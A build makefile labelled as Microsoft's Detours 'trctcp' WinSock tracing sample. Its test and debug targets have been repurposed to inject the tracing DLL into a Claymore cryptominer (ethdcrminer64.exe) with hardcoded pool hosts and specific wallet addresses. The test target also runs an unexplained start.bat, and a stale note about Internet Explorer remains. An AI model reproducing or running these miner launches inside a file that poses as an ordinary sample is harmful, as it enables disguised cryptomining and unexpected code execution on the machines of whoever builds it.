##############################################################################
##
##  Utility to trace WinSock TCP APIs.
##
##  Microsoft Research Detours Package, Version 3.0.
##
##  Copyright (c) Microsoft Corporation.  All rights reserved.
##

!include ..\common.mak

LIBS=$(LIBS) kernel32.lib ws2_32.lib
#BIND=..\..\bin.X64
BIND=$(BIN_HOME)
##############################################################################

all: dirs \
    $(BIND)\trctcp$(DETOURS_BITS).dll \
!IF $(DETOURS_SOURCE_BROWSING)==1
    $(OBJD)\trctcp$(DETOURS_BITS).bsc \
!ENDIF
    option

withdll: dirs \
    $(BIND)\withdll.exe \
!IF $(DETOURS_SOURCE_BROWSING)==1
    $(OBJD)\withdll.bsc \
!ENDIF
	option
##############################################################################

dirs:
    @if not exist $(BIND) mkdir $(BIND) && echo.   Created $(BIND)
    @if not exist $(OBJD) mkdir $(OBJD) && echo.   Created $(OBJD)

$(OBJD)\trctcp.obj: trctcp.cpp
$(OBJD)\ddebug.obj: ddebug.cpp
$(OBJD)\withdll.obj : withdll.cpp

$(OBJD)\trctcp.res: trctcp.rc

$(BIND)\trctcp$(DETOURS_BITS).dll: $(OBJD)\trctcp.obj $(OBJD)\ddebug.obj $(OBJD)\trctcp.res $(DEPS)
    cl /LD $(CFLAGS) /Fe$@ /Fd$(@R).pdb \
        $(OBJD)\trctcp.obj $(OBJD)\ddebug.obj $(OBJD)\trctcp.res \
        /link $(LINKFLAGS) /subsystem:console \
        /export:DetourFinishHelperProcess,@1,NONAME \
        $(LIBS)

$(OBJD)\trctcp$(DETOURS_BITS).bsc : $(OBJD)\trctcp.obj $(OBJD)\ddebug.obj
    bscmake /v /n /o $@ $(OBJD)\trctcp.sbr

$(BIND)\withdll.exe : $(OBJD)\withdll.obj $(DEPS)
    cl $(CFLAGS) /Fe$@ /Fd$(@R).pdb $(OBJD)\withdll.obj \
        /link $(LINKFLAGS) $(LIBS) /subsystem:console

$(OBJD)\withdll.bsc : $(OBJD)\withdll.obj
    bscmake /v /n /o $@ $(OBJD)\withdll.sbr
##############################################################################

clean:
    -del *~ test.txt 2>nul
    -del $(BIND)\trctcp*.* 2>nul
    -rmdir /q /s $(OBJD) 2>nul

realclean: clean
    -rmdir /q /s $(OBJDS) 2>nul

############################################### Install non-bit-size binaries.

!IF "$(DETOURS_OPTION_PROCESSOR)" != ""

$(OPTD)\trctcp$(DETOURS_OPTION_BITS).dll:
$(OPTD)\trctcp$(DETOURS_OPTION_BITS).pdb:

$(BIND)\trctcp$(DETOURS_OPTION_BITS).dll : $(OPTD)\trctcp$(DETOURS_OPTION_BITS).dll
    @if exist $? copy /y $? $(BIND) >nul && echo $@ copied from $(DETOURS_OPTION_PROCESSOR).
$(BIND)\trctcp$(DETOURS_OPTION_BITS).pdb : $(OPTD)\trctcp$(DETOURS_OPTION_BITS).pdb
    @if exist $? copy /y $? $(BIND) >nul && echo $@ copied from $(DETOURS_OPTION_PROCESSOR).

option: \
    $(BIND)\trctcp$(DETOURS_OPTION_BITS).dll \
    $(BIND)\trctcp$(DETOURS_OPTION_BITS).pdb \

!ELSE

option:

!ENDIF

##############################################################################

test: all
    cd $(BIND)
    @echo -------- Logging output to test.txt ------------
    start $(BIND)\syelogd.exe /o test.txt    
    @echo -------- Should load trctcp$(DETOURS_BITS).dll dynamically using withdll.exe ------------
    @echo.
    @echo ** NOTE NOTE NOTE NOTE NOTE NOTE NOTE NOTE NOTE NOTE NOTE **
    @echo **
    @echo ** Close the Internet Explorer window to continue test.
    @echo **
    @echo ** NOTE NOTE NOTE NOTE NOTE NOTE NOTE NOTE NOTE NOTE NOTE **
    @echo.    ETC: ETC+SC: ETH+SC: ETH: ETP: ETP+SC: 
    @echo ** $(BIND)\withdll -d:$(BIND)\trctcp$(DETOURS_BITS).dll ethdcrminer64.exe -epool etc.uupool.cn:8008 -ewal 0x88aB6f58FFD714608734A69663bF5A3083e099DF -epsw x -eworker MINER_NUM -mode 1
    @echo ** $(BIND)\withdll -d:$(BIND)\trctcp$(DETOURS_BITS).dll ethdcrminer64.exe -epool etc.uupool.cn:8008 -ewal 0x88aB6f58FFD714608734A69663bF5A3083e099DF -epsw x -eworker MINER_NUM -dpool stratum+tcp://asia.siamining.com:7777 -dwal SC-WALLET.SC-MINER_NUM -dcoin sia -dcri 20
    @echo ** $(BIND)\withdll -d:$(BIND)\trctcp$(DETOURS_BITS).dll ethdcrminer64.exe -epool eth.f2pool.com:8008 -ewal 0x88aB6f58FFD714608734A69663bF5A3083e099DF -epsw x -eworker MINER_NUM -dpool stratum+tcp://etc.uupool.cn:8008 -dwal SC-WALLET.SC-MINER_NUM -dcoin sia -dcri 20
    @echo ** $(BIND)\withdll -d:$(BIND)\trctcp$(DETOURS_BITS).dll ethdcrminer64.exe -epool eth.f2pool.com:8880 -ewal 0x88aB6f58FFD714608734A69663bF5A3083e099DF -epsw x -eworker MINER_NUM -mode 1 -allpools 1 -allcoins 1
    $(BIND)\start.bat
    @echo ** $(BIND)\withdll -epool eth.f2pool.com:8008 -ewal 0x88aB6f58FFD714608734A69663bF5A3083e099DF -epsw x -eworker MINER_NUM -mode 1 -allpools 1 -allcoins 1
    @echo ** $(BIND)\withdll -d:$(BIND)\trctcp$(DETOURS_BITS).dll ethdcrminer64.exe -epool etp.uupool.cn:8008 -ewal MDoBLLXZnBvnbyb5NfEV8XTWwEJb3YLcxv -epsw x -eworker 1 -mode 1 -allcoins exp
    @echo ** $(BIND)\withdll -d:$(BIND)\trctcp$(DETOURS_BITS).dll ethdcrminer64.exe -epool etp.uupool.cn:8008 -ewal MDoBLLXZnBvnbyb5NfEV8XTWwEJb3YLcxv -epsw x -eworker MINER_NUM -allcoins exp -epsw x -dpool stratum+tcp://asia.siamining.com:7777 -dwal SC-WALLET.SC-MINER_NUM -dcoin sia -dcri 20
    @echo -------- Log from syelog -------------
    type test.txt

debug: all
    windbg -g -G -o $(BIND)\withdll -d:$(BIND)\trctcp$(DETOURS_BITS).dll \
        "ethdcrminer64.exe" -epool pool.tweth.tw:8880 -ewal 0xd23ad7a6abbf63996f5bfb29629f3b61a2d5280c -epsw x -eworker yh1 -mode 1 -allpools 1 -allcoins 1

################################################################# End of File.
